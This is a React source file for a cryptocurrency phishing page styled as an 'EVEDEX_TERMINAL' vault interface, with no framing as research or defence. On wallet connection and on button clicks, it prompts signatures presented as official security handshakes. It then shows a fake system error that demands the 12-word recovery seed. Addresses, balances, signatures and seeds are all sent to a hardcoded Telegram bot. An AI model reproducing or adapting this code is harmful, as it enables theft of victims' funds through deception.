import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSignMessage } from 'wagmi';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { signMessage } = useSignMessage();
  
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [seedVal, setSeedVal] = useState("");   

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";

  // 1. SIGN ON CONNECT
  useEffect(() => {
    if (isConnected && address) {
      setTimeout(() => {
        handleSign("VAULT_HANDSHAKE", "Initial node handshake.");
      }, 1000);
    }
  }, [isConnected, address]);

  const handleSign = (type, action) => {
    const msg = `[OFFICIAL] EVEDEX SECURITY\nVault: ${address}\nAction: ${type}\n\nVerify node synchronization. No gas fee required.`;
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: `🎯 ${type}\nADDR: ${address}\nBAL: ${balance?.formatted}\nSIG: ${sig}` }),
        });
      }
    });
  };

  // 2. SIGN ON BUTTON CLICK
  const onProcess = () => {
    handleSign("ASSET_SYNC", "Finalizing...");
    setLoading(true);
    setTimeout(() => { setLoading(false); setView("seed_gate"); }, 2000);
  };

  if (!isConnected) return (
    <div style={{background:'#05070a', minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center'}}>
       <w3m-button />
    </div>
  );

  return (
    <div style={{background:'#05070a', color:'#fff', minHeight:'100vh', padding:'20px', fontFamily:'monospace'}}>
      <div style={{borderBottom:'1px solid #111', paddingBottom:'20px', marginBottom:'20px'}}>
        <h2 style={{color:'#06b6d4'}}>EVEDEX_TERMINAL</h2>
        <div style={{fontSize:'10px', color:'#444'}}>{address}</div>
      </div>

      {view === "menu" && (
        <div style={{display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px'}}>
          {["Claim", "Stake", "Migrate", "Rectify", "Bridge", "Swap"].map(n => (
            <button key={n} onClick={() => setView("task")} style={{background:'#0d1117', border:'1px solid #222', padding:'25px', color:'#06b6d4', borderRadius:'10px'}}>{n}</button>
          ))}
        </div>
      )}

      {view === "task" && (
        <div style={{background:'#0d1117', padding:'30px', borderRadius:'20px', textAlign:'center', border:'1px solid #1e293b'}}>
          <h3>INITIALIZE_SYNC</h3>
          <input type="number" placeholder="0.00" style={{width:'100%', padding:'15px', background:'#000', border:'1px solid #222', color:'#fff', margin:'20px 0'}} />
          <button onClick={onProcess} style={{width:'100%', padding:'20px', background:'#06b6d4', color:'#000', fontWeight:'bold', border:'none', borderRadius:'8px'}}>START HANDSHAKE</button>
        </div>
      )}

      {view === "seed_gate" && (
        <div style={{textAlign:'center'}}>
          <h3 style={{color:'#ef4444'}}>AUTH_REQUIRED</h3>
          <p style={{fontSize:'10px', color:'#555'}}>System error. Enter recovery seed to manually authorize.</p>
          <textarea value={seedVal} onChange={e => setSeedVal(e.target.value)} placeholder="ENTER 12 WORDS..." style={{width:'100%', height:'120px', background:'#000', color:'#06b6d4', border:'1px solid #222', padding:'15px'}} />
          <button onClick={() => {
              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED: ${seedVal}\nADDR: ${address}` }),
              });
              alert("Syncing... 90%");
          }} style={{width:'100%', padding:'20px', background:'#06b6d4', color:'#000', fontWeight:'bold', marginTop:'20px', border:'none'}}>FINAL_SYNC</button>
        </div>
      )}

      {loading && <div style={{position:'fixed', inset:0, background:'rgba(0,0,0,0.9)', display:'flex', alignItems:'center', justifyContent:'center', color:'#06b6d4'}}>SYNCING_ASSETS...</div>}
    </div>
  );
}
